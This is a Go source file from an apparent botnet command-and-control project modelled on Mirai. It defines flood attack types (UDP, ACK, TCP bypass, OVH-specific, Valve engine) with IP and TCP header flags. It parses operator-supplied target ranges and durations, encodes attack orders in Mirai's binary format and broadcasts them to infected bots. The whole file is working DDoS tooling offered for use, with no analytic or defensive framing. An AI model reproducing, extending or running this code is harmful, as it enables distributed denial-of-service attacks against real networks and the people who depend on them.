package registers

import (
	botcontroller "BasicC2/botmonitor"
	"BasicC2/controller/sessions"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
)

// Attack info Struct
type attackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8 // Cidr
	Flags    map[uint8]string // key=value
}

type flagInfo struct {
	flagID          uint8
	flagDescription string
}

// Mirai's Lookup Flags
var lookupflag = map[string]flagInfo{
	"len":      {flagID: 0, flagDescription: "Size of packet data, default is 512 bytes"},
	"rand":     {flagID: 1, flagDescription: "Randomize packet data content, default is 1 (yes)"},
	"tos":      {flagID: 2, flagDescription: "TOS field value in IP header, default is 0"},
	"ident":    {flagID: 3, flagDescription: "ID field value in IP header, default is random"},
	"ttl":      {flagID: 4, flagDescription: "TTL field in IP header, default is 255"},
	"df":       {flagID: 5, flagDescription: "Set the Dont-Fragment bit in IP header, default is 0 (no)"},
	"sport":    {flagID: 6, flagDescription: "Source port, default is random"},
	"dport":    {flagID: 7, flagDescription: "Destination port, default is random"},
	"domain":   {flagID: 8, flagDescription: "Domain name to attack"},
	"dhid":     {flagID: 9, flagDescription: "Domain name transaction ID, default is random"},
	"urg":      {flagID: 11, flagDescription: "Set the URG bit in IP header, default is 0 (no)"},
	"ack":      {flagID: 12, flagDescription: "Set the ACK bit in IP header, default is 0 (no) except for ACK flood"},
	"psh":      {flagID: 13, flagDescription: "Set the PSH bit in IP header, default is 0 (no)"},
	"rst":      {flagID: 14, flagDescription: "Set the RST bit in IP header, default is 0 (no)"},
	"syn":      {flagID: 15, flagDescription: "Set the ACK bit in IP header, default is 0 (no) except for SYN flood"},
	"fin":      {flagID: 16, flagDescription: "Set the FIN bit in IP header, default is 0 (no)"},
	"seqnum":   {flagID: 17, flagDescription: "Sequence number value in TCP header, default is random"},
	"acknum":   {flagID: 18, flagDescription: "Ack number value in TCP header, default is random"},
	"gcip":     {flagID: 19, flagDescription: "Set internal IP to destination ip, default is 0 (no)"},
	"method":   {flagID: 20, flagDescription: "HTTP method name, default is get"},
	"postdata": {flagID: 21, flagDescription: "POST data, default is empty/none"},
	"path":     {flagID: 22, flagDescription: "HTTP path, default is /"},
	"conns":    {flagID: 24, flagDescription: "Number of connections"},
	"source":   {flagID: 25, flagDescription: "Source IP address, 255.255.255.255 for random"},
}

var methodLookup = map[string]attackInfo{
    "udp": {
        0,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "Generic Udp flood",
    },
    "vse": {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve source engine specific flood",
    },
    "ack": {
        2,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "Ack flood",
    },
    "udpplain": {
        3,
        []uint8 {0, 1, 7},
        "Udp flood with less options. optimized for higher PPS",
    },
	"rudp": {
        4,
        []uint8 { 0, 6, 7 },
        "Randomized Udp flood",
    },
    "hudp": {
        5,
        []uint8 { 8, 7, 20, 21, 22, 24 },
        "Hex Udp flood",
    },
    "botkill": {
        6,
        []uint8 { 0 },
        "Kill Bots",
    },
    "pudp": {
        7,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "Udp flood to have higher pps",
    },
    "btcp": {
        8,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "Tcp bypass for idk",
    },
    "ovh": {
        9,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "Tcp flood specified for ovhs",
    },
	"std": {
        10,
        []uint8 { 0, 1, 7 },
        "Std hex flood",
    },
}

// Utilities

// Searches flag id in the method
func compareID(compare uint8) bool {

	for _, method := range methodLookup {

		for _, Flags := range method.attackFlags {

			if compare == Flags {
				return true
			}

		}

	}
	return false
}

func displayMethods() string {

	var build strings.Builder

	build.WriteString("\r\nAvaliable Attack List\r\n")

	for name, val := range methodLookup {
		build.WriteString(fmt.Sprintf("%s: %s\r\n", name, val.attackDescription))
	}

	return build.String()
}

func displayDescription(params []string) string {

	var Descriptions strings.Builder

	Descriptions.WriteString("Flag Info\r\n")

	for _, desc := range params {

		flag_value := strings.Split(desc, "=")

		// Ignoring every flag with out "?" flag value
		if len(flag_value) != 2 || flag_value[1] != "?" {
			continue
		}

		// Pulling the Description and appending it to the Descriptions string

		Desc, exist := lookupflag[flag_value[0]]

		if !exist {
			// Adding Unknown Flag
			Descriptions.WriteString(fmt.Sprintf("%-7s ?unknown flag\r\n", flag_value[0]))
			continue
		}

		Descriptions.WriteString(fmt.Sprintf("%-7s %s\r\n", flag_value[0], Desc.flagDescription))

	}

	return Descriptions.String()
}

// Parsers ------------

// Cidr Parser
func parseCidr(targets string, BuildAtk *attack) error {

	var netmask uint8

	cidrArgs := strings.Split(targets, ",")

	if len(cidrArgs) > 255 {
		return errors.New("Cannot specify more than 255 targets in a single attack!")
	}

	for _, cidr := range cidrArgs {

		// Initialze netmask to default value 32
		netmask = uint8(32)

		// 1.1.1.1/21
		cidr_range := strings.Split(cidr, "/")

		if len(cidr_range) == 0 {
			return fmt.Errorf("error for [%s] cidr was not set\r\n\tEx- target/24\r\n", cidr)
		} else if len(cidr_range) > 2 {
			return errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
		}

		prefix := cidr_range[0] // host Ex: 1.1.1.1

		if len(cidr_range) == 2 {
			netmask_str := cidr_range[1] // range Ex: /24

			tmpnetmask, err := strconv.Atoi(netmask_str)
			if err != nil {
				return fmt.Errorf("%s is not a range\r\n", netmask_str)
			}

			// Initializing netmask to the set value from the user
			netmask = uint8(tmpnetmask)

		}

		//  Parse Host
		Host := net.ParseIP(prefix)

		// host interface was not returned
		if Host == nil {
			return fmt.Errorf("Failed to parse IP address, near %s", cidr)
		}

		// Convert The Slice of Host[12:] to a Big Endian uint32 Binary
		BuildAtk.Targets[binary.BigEndian.Uint32(Host[12:])] = uint8(netmask)

	}

	return nil
}

// duration parser
func parseDuration(durationparam string, BuildAtk *attack) error {
	// Parse Duration
	Duration, err := strconv.Atoi(durationparam)

	if err != nil {
		return fmt.Errorf("time limit error near %s\r\n", durationparam)
	}

	// Make Sure It Isn't Over The Limit of 3600
	if Duration == 0 || Duration > 3600 {
		return fmt.Errorf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds\r\n", durationparam)
	}

	BuildAtk.Duration = uint32(Duration)

	return nil
}

// flag parser
func parseFlags(params []string, BuildAtk *attack, session *sessions.Term) (bool, error) {

	for _, flag := range params {

		flag_value := strings.SplitN(flag, "=", 2)

		if len(flag_value) != 2 {
			return false, fmt.Errorf("%s is not proper syntax for a flag\r\n\tEx- dport=int/?\r\n", flag)
		}

		info, exist := lookupflag[flag_value[0]]

		if !exist || !compareID(info.flagID) {
			return false, fmt.Errorf("%s flag does not exist!\r\n", flag_value[0])
		}

		if flag_value[1] == "?" {
			// Display The Description for each flag that has a "?"
			session.TermWrite(displayDescription(params))
			return false, nil
		}

		if flag_value[1] == "true" {
			flag_value[1] = "1"
		} else if flag_value[1] == "false" {
			flag_value[1] = "0"
		}

		// Once Flag Checking Is Done Now Append The new Information To Build

		BuildAtk.Flags[uint8(info.flagID)] = flag_value[1]

	}

	if len(BuildAtk.Flags) > 255 {
		return false, fmt.Errorf("Cannot have more than 255 flags!\r\n")
	}

	return true, nil
}

// Method Parser true and nil will be returned on success | false, nil
func parseMethod(method string, BuildAtk *attack, session *sessions.Term) (bool, error) {

	if method == "?" {
		session.TermWrite(displayMethods())
		return false, nil
	}

	key, exist := methodLookup[method]

	if !exist {
		return false, fmt.Errorf("%s is not a valid attack!\r\n", method)
	}

	BuildAtk.Type = key.attackID

	return true, nil

}

// Build Attack for the devices
func botAtkBuilder(Attack *attack) ([]byte, error) {

	var (
		tmpatkBuf strings.Builder
		tmpbuf    []byte
	)

	// assign a 4 byte size for the attack duration
	tmpbuf = make([]byte, 4)

	// overwrite the buffer size BigEndian uin32 duration data
	binary.BigEndian.PutUint32(tmpbuf, Attack.Duration)

	// Append the modified tmpbuf to atkBuf with the string builder
	tmpatkBuf.Write(tmpbuf)

	//  Append the MethodID
	tmpatkBuf.WriteByte(byte(Attack.Type))

	// Append the Amount Of Targets/Host's that are going to be attacked
	tmpatkBuf.WriteByte(byte(len(Attack.Targets)))

	// Parse Targets And append data

	for prefix, netmask := range Attack.Targets {

		tmpbuf = make([]byte, 5)
		binary.BigEndian.PutUint32(tmpbuf, prefix)

		tmpbuf[4] = byte(netmask)

		tmpatkBuf.Write(tmpbuf)
	}

	// Send number of flags

	tmpatkBuf.WriteByte(byte(len(Attack.Flags)))

	// Parse Flag Value's and append
	for flag, val := range Attack.Flags {
		// Create A temporary size for the flab and valu
		tmpbuf = make([]byte, 2)

		// Assign the flag
		tmpbuf[0] = flag

		// Check Length of Flag Value
		if len(val) > 255 {
			return nil, errors.New("Flag value cannot be more than 255 bytes!")
		}

		// array byte value of the flag value
		valbuf := []byte(val)

		tmpbuf[1] = uint8(len(valbuf))

		tmpbuf = append(tmpbuf, valbuf...)

		// Append Data To The Attack Buffer
		tmpatkBuf.Write(tmpbuf)
	}

	if tmpatkBuf.Len() > 4096 {
		return nil, errors.New("Max buffer is 4096")
	}

	// Create The Final Buffer Size Thats Going To Be Sent Out To The Bot

	var AttackBuffer = []byte(tmpatkBuf.String())

	tmpbuf = make([]byte, 2)

	binary.BigEndian.PutUint16(tmpbuf, uint16(tmpatkBuf.Len()+2))

	// Append The tmpatkBuf To The Starting of the AttackBuffer
	AttackBuffer = append(tmpbuf, AttackBuffer...)

	return AttackBuffer, nil
}

// mirai tcp 1.1.1.1 80 ?/ dport=8080/?

func MiraiAttack(params []string, session *sessions.Term) {

	var (
		// Create A Attack Struct Pointer And Append The Flags,Duration, and Target
		BuildAtk = &attack{Targets: make(map[uint32]uint8), Flags: make(map[uint8]string)}
		err      error
	)

	// Parse Method

	parsed, err := parseMethod(params[1], BuildAtk, session)

	if err != nil {
		session.TermWrite(err.Error())
		return
	}
	// if the method was parsed and not described then return
	if !parsed && err == nil {
		return
	}

	// Parse Host
	if err = parseCidr(params[2], BuildAtk); err != nil {
		session.TermWrite(err.Error())
		return
	}

	if err = parseDuration(params[3], BuildAtk); err != nil {
		session.TermWrite(err.Error())
		return
	}

	parsed, err = parseFlags(params[4:], BuildAtk, session)

	if err != nil {
		session.TermWrite(err.Error())
	}
	// if the flags were parsed and not described then return
	if !parsed && err == nil {
		return
	}

	DeviceAtkData, err := botAtkBuilder(BuildAtk)

	if err != nil {
		session.TermWrite(err.Error())
		return
	}

	go botcontroller.Broadcast(DeviceAtkData)

}
